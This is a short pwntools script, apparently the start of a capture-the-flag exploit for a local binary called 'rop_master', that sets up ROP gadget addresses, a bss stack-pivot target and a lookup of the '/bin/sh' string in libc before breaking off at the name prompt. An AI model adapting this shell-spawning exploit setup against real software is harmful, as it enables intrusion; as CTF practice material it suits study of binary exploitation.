from pwn import *

p = process("./rop_master")
e = ELF("./rop_master")
libc = e.libc

pop_rdi = 0x00400613
pop_rsi_r15 = 0x00400611
leave_ret = 0x004005a2
bss = 0x601040 + 0x400
bin_sh = libc.search('/bin/sh').next()

p.recvuntil(b"Your name : ")
